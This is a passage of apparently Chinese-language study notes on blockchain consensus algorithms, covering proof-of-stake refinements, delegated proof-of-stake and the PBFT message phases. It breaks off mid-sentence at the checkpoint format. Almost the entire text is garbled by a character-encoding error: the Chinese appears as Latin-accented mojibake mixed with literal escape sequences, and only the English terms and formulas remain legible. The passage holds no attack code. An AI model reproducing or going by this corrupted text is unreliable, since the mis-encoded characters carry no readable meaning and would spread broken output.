ä¸ºå¦‚æœä¸è€ƒè™‘æ‰‹ç»­è´¹ï¼ŒæŒå¸ç”¨æˆ·æ¯éš”å‡ ä¸ªæœˆæ‰“å¼€èŠ‚ç‚¹é“¸å¸ï¼Œæˆ–è€…å®æ—¶åœ¨çº¿é“¸å¸ï¼Œç†è®ºä¸Šæ”¶ç›Šéƒ½æ˜¯ä¸€æ ·çš„ã€‚\n  stakeMinAge POSç³»ç»Ÿä¹Ÿå­˜åœ¨51%å¸é¾„æ”»å‡»é£é™©ï¼Œä¸ºäº†å¢åŠ æ”»å‡»éš¾åº¦ï¼ŒSunny Kingå¯¹æ¯ä¸€ç¬”UTXOçš„é“¸å¸èµ„æ ¼åšäº†æœ€å°å¹´é¾„ï¼ˆstakeMinAgeï¼‰é™åˆ¶ï¼šä¸€ä¸ªUTXOåœ¨åŒºå—é“¾å­˜åœ¨çš„æ—¶é—´å°äºstakeMinAgeåˆ™æ²¡æœ‰é“¸å¸èµ„æ ¼ï¼ŒPPCæœ€å°å¸é¾„ä¸º8å°æ—¶ã€‚\n  POS2.0 é»‘å¸ç¤¾åŒºè®¤ä¸ºå¸é¾„å¯èƒ½ä¼šè¢«æ¶æ„çš„èŠ‚ç‚¹æ»¥ç”¨ä»¥è·å¾—æ›´é«˜çš„ç½‘ç»œæƒé‡å¹¶æˆåŠŸå®æ–½åŒèŠ±æ”»å‡»ï¼Œäºæ˜¯å‘å¸ƒPOS2.0ç™½çš®ä¹¦ï¼Œå¯¹PPCåšäº†å‡ ä¸ªç»†èŠ‚ä¼˜åŒ–ï¼Œè§£å†³äº†ä¸€äº›æ½œåœ¨çš„å®‰å…¨é—®é¢˜ï¼Œå…¶ä¸­æœ€é‡è¦çš„æ”¹è¿›æ˜¯ç”¨ä½™é¢ä»£æ›¿å¸é¾„ï¼Œåˆæ ¼åŒºå—çš„æ¡ä»¶ç”±ï¼š\nF(Timastamp) \u003c Target * å¸æ•° * å¸çš„å¹´é¾„\nå˜ä¸ºï¼š F(Timastamp) \u003c Target * å¸æ•°\nå¦‚æ­¤ä¸€æ¥ï¼Œä¸€ç¬”UTXOæ— è®ºæ”¾ç½®å¤šä¹…å…¶é”»é€ åŒºå—çš„èƒ½åŠ›ä¸å˜ï¼Œæ­¤ä¸¾å¯æ¿€åŠ±èŠ‚ç‚¹å¿…é¡»æ›´å¤šçš„ä¿æŒåœ¨çº¿è¿›è¡Œé“¸å¸ï¼Œæé«˜ç³»ç»Ÿå®‰å…¨æ€§ï¼Œå°†æ”»å‡»é€”å¾„å‡å°‘åˆ°æœ€ä½é™åº¦ï¼Œå¹¶ä¸”èƒ½å¤Ÿæ˜¾è‘—æé«˜ç½‘ç»œä¿æŒè¿è¡Œçš„èŠ‚ç‚¹æ•°é‡ã€‚\nPOS3.0 é»‘å¸ç¤¾åŒºåæ¥è¿›ä¸€æ­¥å‡çº§ï¼Œæ¨å‡ºPOS3.0ç‰ˆæœ¬ï¼Œå¯¹äº¤æ˜“æ‰‹ç»­è´¹ï¼Œéš¾åº¦è°ƒæ•´åšäº†ä¸€äº›ä¼˜åŒ–ï¼Œå…¶ä¸­æœ€æ˜¾è‘—çš„æ”¹å˜æ˜¯å°†1%å¹´åˆ©ç‡å¥–åŠ±æœºåˆ¶å˜ä¸ºå›ºå®šæ•°é¢å¥–åŠ±ï¼ˆæ¯ä¸ªåŒºå—å›ºå®šå¥–åŠ±1.5BLKï¼‰ï¼Œæ­¤ä¸¾ä¸ä½†é™ä½ä»£å¸é€šèƒ€ç‡ï¼ˆè€ƒè™‘åˆ°ä¼šæœ‰ä»£å¸æ°¸ä¹…ä¸¢å¤±ï¼Œä½é¢å¥–åŠ±æœºåˆ¶å›å½’æ€»é‡æ’å®šçš„è®¾è®¡æ€è·¯ï¼‰ï¼ŒåŒæ—¶æ„å‘³ç€æŒå¸èŠ‚ç‚¹å¿…é¡»å®æ—¶åœ¨çº¿æ‰èƒ½è·å¾—æ”¶ç›Šã€‚\nPOSçš„ä¼˜ç¼ºç‚¹  ä¼˜ç‚¹ï¼šåœ¨ä¸€å®šç¨‹åº¦ä¸Šç¼©çŸ­äº†å…±è¯†è¾¾æˆçš„æ—¶é—´ ç¼ºç‚¹ï¼šè¿˜éœ€è¦æŒ–çŸ¿ï¼Œæœ¬è´¨ä¸Šæ²¡æœ‰è§£å†³å•†ä¸šåº”ç”¨çš„ç—›ç‚¹  DPoS DPOSï¼šè‚¡ä»½æˆæƒè‚¡ä»½è¯æ˜ï¼ˆDelegated Proof-Of-Stakeï¼‰\n https://blog.csdn.net/liankuaixy/article/details/79820710\n æ¯”ç‰¹è‚¡ï¼ˆBitsharesï¼‰é¡¹ç›®äº2013å¹´8æœˆå¼€å§‹å¯åŠ¨ï¼Œå¯¹åŒºå—é“¾åšäº†å¾ˆå¤šæ”¹é€ ï¼Œå¹¶å¼•å…¥è®¸å¤šæ–°æ¦‚å¿µå’Œç‰¹å¾ï¼Œå°¤å…¶ä»¤äººçœ¼èŠ±ç¼­ä¹±çš„ Bitshares Xã€å¤šæ€æ•°å­—èµ„äº§äº¤æ˜“å¹³å°ã€èµ„äº§é”šå®šç­‰æ–°åè¯ï¼Œä¸€æ—¶ä»¤äººæ— æ¯”å…´å¥‹è€Œåˆå›°æƒ‘ã€‚æ­¤æ—¶POWå’ŒPOSéƒ½å·²æˆåŠŸè¿è¡Œè®¸ä¹…ï¼Œå½¼æ­¤ä¼˜åŠ£å·²è¢«åå¤è®¨è®ºï¼Œä¸¤å¤§é˜µè¥æ—¶è‡³ä»Šæ—¥ä¾ç„¶äº‰è®ºä¸ä¼‘ã€‚æŒ‰ç…§é¡¹ç›®è§„åˆ’ï¼Œæ¯”ç‰¹è‚¡å¯¹äº¤æ˜“å®¹é‡å’ŒåŒºå—é€Ÿåº¦æœ‰æé«˜è¦æ±‚ï¼Œæ˜¾ç„¶POWæˆ–POSéƒ½è¾¾ä¸åˆ°è¦æ±‚ï¼Œäºæ˜¯æ¯”ç‰¹è‚¡å‘æ˜äº†ä¸€ç§æ–°çš„å…±è¯†æœºåˆ¶DPOSï¼Œå³è‚¡ä»½æˆæƒè‚¡æƒè¯æ˜ã€‚\nDPOSæ˜¯ PoS çš„è¿›åŒ–æ–¹æ¡ˆï¼Œåœ¨å¸¸è§„ PoW å’Œ PoS ä¸­ï¼Œä¸€å¤§å½±å“æ•ˆç‡ä¹‹å¤„åœ¨äºä»»ä½•ä¸€ä¸ªæ–°åŠ å…¥çš„ Blockï¼Œéƒ½éœ€è¦è¢«æ•´ä¸ªç½‘ç»œæ‰€æœ‰èŠ‚ç‚¹åšç¡®è®¤ã€‚\nDPoS ä¼˜åŒ–æ–¹æ¡ˆ â€‹\té€šè¿‡ä¸åŒçš„ç­–ç•¥ï¼Œä¸å®šæ—¶çš„é€‰ä¸­ä¸€å°ç¾¤èŠ‚ç‚¹ï¼Œè¿™ä¸€å°ç¾¤èŠ‚ç‚¹åšæ–°åŒºå—çš„åˆ›å»ºï¼ŒéªŒè¯ï¼Œç­¾åå’Œç›¸äº’ç›‘ç£ï¼Œè¿™æ ·å°±å¤§å¹…åº¦çš„å‡å°‘äº†åŒºå—åˆ›å»ºå’Œç¡®è®¤æ‰€éœ€è¦æ¶ˆè€—çš„æ—¶é—´å’Œç®—åŠ›æˆæœ¬ã€‚\nDPOSæœºåˆ¶æ¶‰åŠçš„é—®é¢˜  1. æŒæœ‰è‚¡ç¥¨\nç›´æ¥åœ¨äº¤æ˜“å¹³å°ä¸Šè´­ä¹°æ¯”ç‰¹è‚¡å³å¯\n2. æˆä¸ºä»£è¡¨\næˆä¸ºä¸€åä»£è¡¨ï¼Œä½ å¿…é¡»åœ¨ç½‘ç»œä¸Šæ³¨å†Œä½ çš„å…¬é’¥ï¼Œåˆ†é…åˆ°ä¸€ä¸ª32ä½çš„ç‰¹æœ‰æ ‡è¯†ç¬¦\n3. æˆæƒé€‰ç¥¨\næ¯ä¸ªé’±åŒ…æœ‰ä¸€ä¸ªå‚æ•°è®¾ç½®çª—å£ï¼Œåœ¨è¯¥çª—å£é‡Œç”¨æˆ·å¯ä»¥é€‰æ‹©ä¸€ä¸ªæˆ–æ›´å¤šçš„ä»£è¡¨ï¼Œå¹¶å°†å…¶åˆ†çº§\nä¸€èˆ¬æƒ…å†µä¸‹ï¼Œç”¨æˆ·ä¸ä¼šåˆ›å»ºç‰¹åˆ«ä»¥æŠ•ç¥¨ä¸ºç›®çš„çš„äº¤æ˜“ï¼Œå› ä¸ºé‚£å°†è€—è´¹ä»–ä»¬ä¸€ç¬”äº¤æ˜“è´¹\n4. ä¿æŒä»£è¡¨è¯šå®\næ¯ä¸ªé’±åŒ…å°†æ˜¾ç¤ºä¸€ä¸ªçŠ¶æ€æŒ‡ç¤ºå™¨ï¼Œè®©ç”¨æˆ·çŸ¥é“ä»–ä»¬çš„ä»£è¡¨è¡¨ç°å¦‚ä½•\n5. æŠµæŠ—æ”»å‡»\nåœ¨æŠµæŠ—æ”»å‡»ä¸Šï¼Œå› ä¸ºå‰100åä»£è¡¨æ‰€è·å¾—çš„æƒåˆ©æƒæ˜¯ç›¸åŒçš„ï¼Œæ¯åä»£è¡¨éƒ½æœ‰ä¸€ä»½ç›¸ç­‰çš„æŠ•ç¥¨æƒï¼Œå¹¶ä¸”ï¼Œå¦‚æœå½“å‰è®°è´¦èŠ‚ç‚¹ä¸è®°è´¦åˆ™ç”±ä¸‹ä¸€ä¸ªè®°è´¦äººè®°è´¦ï¼Œå› æ­¤æ— æ³•é€šè¿‡è·å¾—è¶…è¿‡1%çš„é€‰ç¥¨è€Œå°†æƒåŠ›é›†ä¸­åˆ°ä¸€ä¸ªå•ä¸€ä»£è¡¨ä¸Šï¼Œæ¯•ç«ŸåŒæ—¶æ”¶ä¹°100ç»™ä»£è¡¨çš„éš¾åº¦å¾ˆå¤§ã€‚åŒæ—¶ï¼Œæ¯åä»£è¡¨çš„æ ‡è¯†æ˜¯å…¶å…¬é’¥è€ŒéIPåœ°å€ï¼Œä½¿å¾—DOSæ”»å‡»ç›®æ ‡æ›´ä¸ºå›°éš¾ï¼ˆéš¾å®šä½ï¼‰\n6. ä»£è¡¨ç«é€‰\né€‰å‡ºçš„ä»£è¡¨æ‹¥æœ‰æå‡ºæ”¹å˜ç½‘ç»œå‚æ•°çš„ç‰¹æƒï¼ŒåŒ…æ‹¬äº¤æ˜“è´¹ç”¨ã€åŒºå—å¤§å°ã€è§è¯äººè´¹ç”¨å’ŒåŒºå—åŒºé—´\n DPOSéµå¾ªçš„åŸºæœ¬åŸåˆ™  æŒè‚¡äººä¾æ®æ‰€æŒè‚¡ä»½è¡Œä½¿è¡¨å†³æƒï¼Œè€Œä¸æ˜¯ä¾èµ–æŒ–çŸ¿ç«äº‰è®°è´¦æƒ æœ€å¤§åŒ–æŒè‚¡äººçš„ç›ˆåˆ© æœ€å°åŒ–ç»´æŠ¤ç½‘ç»œå®‰å…¨çš„è´¹ç”¨ æœ€å¤§åŒ–ç½‘ç»œçš„æ•ˆèƒ½ æœ€å°åŒ–è¿è¡Œç½‘ç»œçš„æˆæœ¬ï¼ˆå¸¦å®½ã€CPUç­‰ï¼‰  DPOSçš„ä¼˜ç¼ºç‚¹   ä¼˜ç‚¹ï¼š     èƒ½è€—æ›´ä½ï¼šDPoSæœºåˆ¶å°†èŠ‚ç‚¹æ•°é‡è¿›ä¸€æ­¥å‡å°‘ï¼Œåœ¨ä¿è¯ç½‘ç»œå®‰å…¨çš„å‰æä¸‹ï¼Œæ•´ä¸ªç½‘ç»œçš„èƒ½è€—è¿›ä¸€æ­¥é™ä½ï¼Œç½‘ç»œè¿è¡Œæˆæœ¬æœ€ä½ã€‚\n  æ›´å¿«çš„ç¡®è®¤é€Ÿåº¦ï¼šæ¯ä¸ªåŒºå—çš„æ—¶é—´ä¸º10ç§’ï¼Œä¸€ç¬”äº¤æ˜“ï¼ˆåœ¨å¾—åˆ°6-10ä¸ªç¡®è®¤åï¼‰å¤§æ¦‚1åˆ†é’Ÿï¼Œä¸€ä¸ªå®Œæ•´çš„åŒºå—çš„å‘¨æœŸå¤§æ¦‚ä»…ä»…éœ€è¦æ•°åˆ†é’Ÿã€‚è€ŒPoWæœºåˆ¶ä¸‹äº§ç”Ÿä¸€ä¸ªåŒºå—éœ€è¦10åˆ†é’Ÿï¼Œä¸€ç¬”äº¤æ˜“å®Œæˆéœ€è¦æ•°ä¸ªå°æ—¶ã€‚\n  åœ¨ä¸€å®šç¨‹åº¦ä¸Šè§£å†³äº†æ‹’ç»æœåŠ¡æ”»å‡»å’Œæ½œåœ¨ä½œæ¶èŠ‚ç‚¹è”åˆä½œæ¶çš„é—®é¢˜ã€‚\n    ç¼ºç‚¹ï¼š     æŠ•ç¥¨çš„ç§¯ææ€§å¹¶ä¸é«˜ï¼šç»å¤§å¤šæ•°æŒè‚¡äººä»æœªå‚ä¸æŠ•ç¥¨ã€‚è¿™æ˜¯å› ä¸ºæŠ•ç¥¨éœ€è¦æ—¶é—´ã€ç²¾åŠ›ä»¥åŠæŠ€èƒ½ï¼Œè€Œè¿™æ°æ°æ˜¯å¤§å¤šæ•°æŠ•èµ„è€…æ‰€ç¼ºä¹çš„ã€‚\n  å„æ–­æ€§é«˜ï¼šDPoSå»¶ç»­äº†PoSçš„å¼Šç«¯ï¼Œåªæœ‰æŒå¸è€…æ‰å¯ä»¥è·å¾—åŒºå—é“¾å¥–åŠ±ï¼Œå…¶å®è¿™å°±å¸¦æ¥äº†ä¸€ç§åˆ¶åº¦æ€§é—¨æ§›ï¼Œæœ€ç»ˆå¯¼è‡´DPoSå¸çš„æµåŠ¨æ€§å¤§å¤§å‡å°‘ï¼Œç©·è€…è¶Šç©·ï¼Œå¯Œè€…è¶Šå¯Œã€‚\n  PBFT PBFTï¼šå®ç”¨æ‹œå åº­å®¹é”™ç®—æ³•ï¼ˆPractical Byzantine Fault Toleranceï¼‰\nä»¥å¾€çš„åŒºå—é“¾é¡¹ç›®éƒ½ä»¥è™šæ‹Ÿå¸ä¸ºå†…æ ¸ï¼Œè€Œè®°å½•æ•°æ®çš„åº”ç”¨ä¸éœ€è¦å¸æœºåˆ¶æ¨¡å‹ã€‚è¿™ä¸ªæ—¶å€™ï¼ŒHyper Ledgerï¼ˆè¶…çº§è´¦æœ¬ï¼‰åº”æ™¯è€Œç”Ÿï¼Œå®ƒæ˜¯ç”±LinuxåŸºé‡‘ä¼šç»„ç»‡ç‰µå¤´çš„é¡¹ç›®ï¼Œæ˜¯ä¸€ä¸ªæ—¨åœ¨æ¨åŠ¨åŒºå—é“¾æ•°å­—æŠ€æœ¯å’Œäº¤æ˜“éªŒè¯çš„å¼€æºé¡¹ç›®ã€‚è¿™ä¸ªåˆ†å¸ƒå¼è´¦æœ¬æŠ€æœ¯æ˜¯å®Œå…¨å…±äº«ã€é€æ˜å’Œå»ä¸­å¿ƒåŒ–çš„ï¼Œéå¸¸é€‚åˆäºé‡‘èè¡Œä¸šçš„åº”ç”¨ï¼Œä»¥åŠå…¶ä»–çš„ä¾‹å¦‚åˆ¶é€ ã€é“¶è¡Œã€ä¿é™©ã€ç‰©è”ç½‘ç­‰æ— æ•°ä¸ªå…¶ä»–è¡Œä¸šã€‚\n PBFTæ˜¯Hyper Ledgerä¸­ä½¿ç”¨çš„å…±è¯†ç®—æ³•   https://learnblockchain.cn/2019/08/29/pbft/\nhttps://blog.csdn.net/jfkidear/article/details/81275974\n PBFTçš„ç®—æ³•åŸºæœ¬æµç¨‹ å‡è®¾æœ‰fä¸ªæ¶æ„èŠ‚ç‚¹ï¼Œåˆ™ä¿è¯ç³»ç»Ÿæ­£å¸¸è¿ä½œï¼Œéœ€è¦æœ‰2f+1ä¸ªæ­£å¸¸èŠ‚ç‚¹ï¼Œæ€»ç»“ç‚¹æ•°ä¸º3f+1\n å®¢æˆ·ç«¯å‘é€è¯·æ±‚ç»™ä¸»èŠ‚ç‚¹ ä¸»èŠ‚ç‚¹å¹¿æ’­è¯·æ±‚ç»™å…¶ä»–èŠ‚ç‚¹ï¼ŒèŠ‚ç‚¹æ‰§è¡Œpbftç®—æ³•çš„ä¸‰é˜¶æ®µå…±è¯†æµç¨‹ èŠ‚ç‚¹å¤„ç†å®Œä¸‰é˜¶æ®µæµç¨‹åï¼Œè¿”å›æ¶ˆæ¯ç»™å®¢æˆ·ç«¯ å®¢æˆ·ç«¯æ”¶åˆ°æ¥è‡ªf+1ä¸ªèŠ‚ç‚¹ç›¸åŒæ¶ˆæ¯åï¼Œä»£è¡¨å…±è¯†å·²ç»æ­£ç¡®å®Œæˆ  å¦‚å›¾ï¼š\nCä¸ºClientï¼Œpre-prepareä¸ºé¢„å‡†å¤‡é˜¶æ®µï¼Œprepareä¸ºå‡†å¤‡é˜¶æ®µï¼Œcommitä¸ºæäº¤é˜¶æ®µ\n Råœ¨ä¸€ä¸ªè§†å›¾é‡Œï¼Œä¸€ä¸ªæ˜¯ä¸»èŠ‚ç‚¹ï¼Œå…¶ä½™çš„éƒ½å«åšå¤‡ä»½èŠ‚ç‚¹ï¼Œå¦‚å›¾ä¸»èŠ‚ç‚¹ä¸º0ï¼Œå³Clienté¦–å…ˆè¯·æ±‚ä¸»èŠ‚ç‚¹è´Ÿè´£å°†å®¢æˆ·ç«¯çš„è¯·æ±‚æ’å¥½åºï¼Œç„¶åæŒ‰åºå‘ç»™å¤‡ä»½èŠ‚ç‚¹\nä½†æ˜¯ä¸»èŠ‚ç‚¹å¯èƒ½æ˜¯æ‹œå åº­çš„ï¼šä»–å¯èƒ½ä¼šç»™ä¸åŒçš„è¯·æ±‚ç¼–ä¸Šç›¸åŒçš„åºå·ï¼Œæˆ–è€…ä¸å»åˆ†é…åºå·ï¼Œåè€…è®©ç›¸é‚»åºå·ä¸è¿ç»­ã€‚\nå¤‡ä»½èŠ‚ç‚¹åº”å½“æœ‰èŒè´£ä¸»åŠ¨æ£€æŸ¥è¿™äº›åºå·çš„åˆæ³•æ€§ï¼Œå¹¶èƒ½é€šè¿‡timeoutæœºåˆ¶æ£€æµ‹åˆ°ä¸»èŠ‚ç‚¹æ˜¯å¦å·²ç»å®•æœºã€‚\nå½“å‡ºç°å¼‚å¸¸æƒ…å†µä¸‹ï¼Œå°±ä¼šå‡ºå‘è§†å›¾æ›´æ¢view changeåè®®æ¥é€‰ä¸¾å‡ºæ–°çš„ä¸»èŠ‚ç‚¹\n Requseté˜¶æ®µ åœ¨æ­¤é˜¶æ®µï¼Œå®¢æˆ·ç«¯cå‘ä¸»èŠ‚ç‚¹på‘é€è¯·æ±‚ï¼Œ\u003cRequestï¼Œoperationï¼Œtimestampï¼ŒclientID\u003e\n operationï¼šä¸ºè¯·æ±‚å…·ä½“æ“ä½œ\ntimestampï¼šè¯·æ±‚æ—¶å®¢æˆ·ç«¯è¿½åŠ çš„æ—¶é—´æˆ³\nclientIDï¼šå®¢æˆ·ç«¯æ ‡è¯†\nRequsetï¼šåŒ…å«æ¶ˆæ¯å†…å®¹messageï¼Œä»¥åŠä¿¡æ¯æ‘˜è¦d(message)\n å®¢æˆ·ç«¯å¯¹è¯·æ±‚è¿›è¡Œç­¾å\nPBFTç®—æ³•é¢„å¤‡ï¼ˆPre-Prepareï¼‰ åœ¨é¢„å‡†å¤‡é˜¶æ®µï¼Œä¸»èŠ‚ç‚¹å¯¹ç­¾åè¿›è¡Œæ ¡éªŒï¼Œå¹¶åˆ†é…ä¸€ä¸ªåºåˆ—å·nç»™æ”¶åˆ°çš„è¯·æ±‚ï¼Œç„¶åå‘æ‰€æœ‰å¤‡ä»½èŠ‚ç‚¹ç¾¤å‘é¢„å‡†å¤‡æ¶ˆæ¯ï¼Œé¢„å‡†å¤‡æ¶ˆæ¯çš„æ ¼å¼ä¸ºï¼š\u003c \u003cPre-Prepareï¼Œvï¼Œnï¼Œd\u003e ï¼Œ m \u003e\n væ˜¯è§†å›¾ç¼–å·\nnæ˜¯åºåˆ—å·\nmæ˜¯å®¢æˆ·ç«¯å‘é€çš„è¯·æ±‚æ¶ˆæ¯\ndæ˜¯è¯·æ±‚æ¶ˆæ¯mçš„æ‘˜è¦\n é¢„å‡†å¤‡æ¶ˆæ¯çš„ç›®çš„æ˜¯ä½œä¸ºä¸€ç§è¯æ˜ï¼Œç¡®å®šè¯¥è¯·æ±‚æ˜¯åœ¨è§†å›¾vä¸­è¢«èµ‹äºˆäº†åºå·n\nåœ¨è§†å›¾å˜æ›´çš„è¿‡ç¨‹ä¸­å¯ä»¥è¿½ç´¢è¯·æ±‚\nè¯·æ±‚æœ¬èº«æ˜¯ä¸åŒ…å«åœ¨é¢„å‡†å¤‡æ¶ˆæ¯ä¸­ï¼Œè¿™æ ·èƒ½ä½¿é¢„å‡†å¤‡æ¶ˆæ¯è¶³å¤Ÿå°\nPrepare å½“èŠ‚ç‚¹æ”¶åˆ°pre-prepareæ¶ˆæ¯åï¼Œä¼šé€‰æ‹©æ¥æ”¶ä¸å¦\næ»¡è¶³ä¸‹åˆ—æ¡ä»¶æ—¶ï¼Œå„ä¸ªå¤‡ä»½èŠ‚ç‚¹æ‰ä¼šæ¥æ”¶ä¸€ä¸ªé¢„å‡†å¤‡æ¶ˆæ¯ï¼šâ‘ è¯·æ±‚å’Œé¢„å‡†å¤‡æ¶ˆæ¯çš„ç­¾åæ­£ç¡®ï¼Œå¹¶ä¸”dä¸mçš„æ‘˜è¦ä¸€è‡´ï¼›â‘¡å½“å‰è§†å›¾ç¼–å·æ˜¯vï¼›â‘¢è¯¥å¤‡ä»½èŠ‚ç‚¹ä»æœªåœ¨è§†å›¾vä¸­æ¥æ”¶è¿‡åºå·ä¸ºnä½†æ˜¯æ‘˜è¦dä¸åŒçš„æ¶ˆæ¯mï¼›â‘£é¢„å‡†å¤‡æ¶ˆæ¯çš„åºå·nå¿…é¡»åœ¨æ°´çº¿ä¸Šä¸‹é™hå’ŒHä¹‹é—´ï¼Œæ°´çº¿å­˜åœ¨çš„æ„ä¹‰åœ¨äºé˜²æ­¢ä¸€ä¸ªå¤±æ•ˆèŠ‚ç‚¹ç”¨ä¸€ä¸ªå¾ˆå¤§çš„åºå·æ¶ˆè€—åºå·ç©ºé—´ã€‚\nå¦‚æœå¤‡ä»½èŠ‚ç‚¹iæ¥å—äº†é¢„å‡†å¤‡æ¶ˆæ¯\u003c \u003cPre-Prepareï¼Œvï¼Œnï¼Œd\u003e ï¼Œ m \u003eï¼Œåˆ™è¿›å…¥å‡†å¤‡é˜¶æ®µã€‚\nåœ¨å‡†å¤‡é˜¶æ®µçš„åŒæ—¶ï¼Œè¯¥èŠ‚ç‚¹å‘æ‰€æœ‰å‰¯æœ¬èŠ‚ç‚¹å‘é€å‡†å¤‡æ¶ˆæ¯ \u003c Prepareï¼Œvï¼Œnï¼Œdï¼Œi \u003eï¼Œå¹¶ä¸”å°†é¢„å‡†å¤‡æ¶ˆæ¯å’Œå‡†å¤‡æ¶ˆæ¯å†™å…¥è‡ªå·±çš„æ¶ˆæ¯æ—¥å¿—ï¼Œå¯ä¸¢å¼ƒéæ³•è¯·æ±‚ï¼ˆå³éæ³•é¢„å‡†å¤‡æ¶ˆæ¯ï¼‰\nèŠ‚ç‚¹ï¼ˆåŒ…æ‹¬ä¸»èŠ‚ç‚¹ï¼‰æ”¶åˆ°prepareæ¶ˆæ¯åï¼Œè¿›è¡ŒéªŒè¯prepareæ¶ˆæ¯ç­¾åæ˜¯å¦æ­£ç¡®ï¼Œè§†å›¾ç¼–å·æ˜¯å¦ä¸€è‡´ï¼Œæ¶ˆæ¯åºå·æ˜¯å¦æ»¡è¶³æ°´çº¿é™åˆ¶ï¼Œè‹¥éªŒè¯é€šè¿‡åˆ™å°†æ¶ˆæ¯å†™å…¥æ¶ˆæ¯æ—¥å¿—ä¸­ã€‚\nå‰¯æœ¬èŠ‚ç‚¹iå°†ï¼ˆmï¼Œvï¼Œnï¼Œiï¼‰è®°å…¥æ¶ˆæ¯æ—¥å¿—ä¸­ï¼Œå…¶ä¸­mæ˜¯è¯·æ±‚å†…å®¹ï¼Œé¢„å‡†å¤‡æ¶ˆæ¯måœ¨è§†å›¾vä¸­çš„ç¼–å·nï¼Œä»¥åŠ2fä¸ªä»ä¸åŒå‰¯æœ¬èŠ‚ç‚¹æ”¶åˆ°çš„ä¸é¢„å‡†å¤‡æ¶ˆæ¯ä¸€è‡´çš„å‡†å¤‡æ¶ˆæ¯\næ¯ä¸ªå‰¯æœ¬èŠ‚ç‚¹éªŒè¯é¢„å‡†å¤‡å’Œå‡†å¤‡æ¶ˆæ¯çš„ä¸€è‡´æ€§ä¸»è¦æ£€æŸ¥ï¼šè§†å›¾ç¼–å·vã€æ¶ˆæ¯åºå·nå’Œæ‘˜è¦d\nCommit å½“prepared (m,v,n,i)æ¡ä»¶ä¸ºçœŸçš„æ—¶å€™ï¼Œ\n  å‰¯æœ¬iç”Ÿæˆç¡®è®¤æ¶ˆæ¯\n  è¿½åŠ åˆ°æœ¬åœ°æ¶ˆæ¯æ—¥å¿—æ–‡ä»¶\n  å°†ç¡®è®¤æ¶ˆæ¯å‘å…¶ä»–å‰¯æœ¬èŠ‚ç‚¹\n  å¹¿æ’­è¿›å…¥äº†ç¡®è®¤é˜¶æ®µ \u003c COMMITï¼Œvï¼Œnï¼ŒD(m)ï¼Œi\u003e\n  æ¯ä¸ªå‰¯æœ¬èŠ‚ç‚¹æ¥æ”¶Commitæ¶ˆæ¯çš„æ¡ä»¶æ˜¯ï¼š\n Commitæ¶ˆæ¯ç­¾åæ­£ç¡® ä¸Šä¸€é˜¶æ®µè¯·æ±‚çš„æ‘˜è¦ä¹Ÿæ˜¯D(m) æ¶ˆæ¯çš„è§†å›¾ç¼–å·ä¸èŠ‚ç‚¹çš„å½“å‰è§†å›¾ç¼–å·ä¸€è‡´ æ¶ˆæ¯çš„åºå·næ»¡è¶³æ°´çº¿æ¡ä»¶ï¼Œåœ¨hå’ŒHä¹‹é—´  ä¸€æ—¦ç¡®è®¤æ¶ˆæ¯çš„æ¥å—æ¡ä»¶æ»¡è¶³äº†ï¼Œåˆ™è¯¥å‰¯æœ¬èŠ‚ç‚¹å°†ç¡®è®¤æ¶ˆæ¯å†™å…¥æ¶ˆæ¯æ—¥å¿—ä¸­\nå½“èŠ‚ç‚¹æ”¶åˆ°2f+1ï¼ˆåŒ…æ‹¬è‡ªèº«ï¼‰ä¸ªä¸åŒèŠ‚ç‚¹å‘é€è¿‡æ¥çš„Commitæ¶ˆæ¯ä¹‹åï¼Œè¿›å…¥Commit-local(mï¼Œvï¼Œn)çŠ¶æ€ï¼Œä¸”æ‰€æœ‰åºå·å°äºnçš„è¯·æ±‚éƒ½è¢«å¤„ç†ï¼Œåˆ™æ‰§è¡Œå®¢æˆ·ç«¯è¯·æ±‚mä¸­æ‰€è¦æ±‚çš„æœåŠ¡æ“ä½œ\nä¿è¯åœ¨èŠ‚ç‚¹ä¸­æäº¤çš„ä»»æ„ä¸€ä¸ªå®¢æˆ·ç«¯è¯·æ±‚ï¼Œæœ€ç»ˆå“¦éƒ½ä¼šåœ¨å¦å¤–2fä¸ªèŠ‚ç‚¹ä¸­è¢«æäº¤åˆ°æœ¬åœ°çš„ï¼Œå¹¶ç¡®ä¿æ‰€æœ‰æ­£å¸¸èŠ‚ç‚¹ä»¥åŒæ ·é¡ºåºæ‰§è¡Œæ‰€æœ‰è¯·æ±‚ï¼Œè¿™æ ·å°±ä¿è¯äº†ç®—æ³•çš„æ­£ç¡®æ€§\nReply åŒæ—¶å°†æ‰§è¡Œç»“æœå‘é€ç»™å®¢æˆ·ç«¯ \u003cReply ï¼Œvï¼Œtï¼Œcï¼Œiï¼Œr\u003eï¼Œrä¸ºè¯·æ±‚æ“ä½œç»“æœ\nå¦‚æœå®¢æˆ·ç«¯æ”¶åˆ°f+1ä¸ªç›¸åŒçš„Replyæ¶ˆæ¯ï¼Œè¯´æ˜å®¢æˆ·ç«¯å‘èµ·çš„è¯·æ±‚å·²ç»è¾¾åˆ°å…¨ç½‘å…±è¯†ï¼Œå¦åˆ™å®¢æˆ·ç«¯éœ€è¦åˆ¤æ–­æ˜¯å¦é‡æ–°å‘é€è¯·æ±‚ç»™ä¸»èŠ‚ç‚¹\nå‰¯æœ¬èŠ‚ç‚¹ä¼šæŠŠæ—¶é—´æˆ³æ¯”å·²å›å¤æ—¶é—´æˆ³æ›´å°çš„è¯·æ±‚ä¸¢å¼ƒï¼Œä»¥ä¿è¯è¯·æ±‚åªä¼šè¢«æ‰§è¡Œä¸€æ¬¡\nPBFT æ£€æŸ¥ç‚¹ ï¼ˆcheckpointï¼‰  å¦‚ä½•æ¸…é™¤å†å²è¯·æ±‚çš„è®°å½•æ¶ˆæ¯ï¼Ÿ\nåœ¨æ‰§è¡Œå®Œå¤šæ¡è¯·æ±‚Kï¼ˆä¾‹å¦‚ï¼š100æ¡ï¼‰åæ‰§è¡Œä¸€æ¬¡çŠ¶æ€åŒæ­¥ï¼Œå³å‘é€CheckPointæ¶ˆæ¯ã€‚\u003cCheckPoint, n, d, 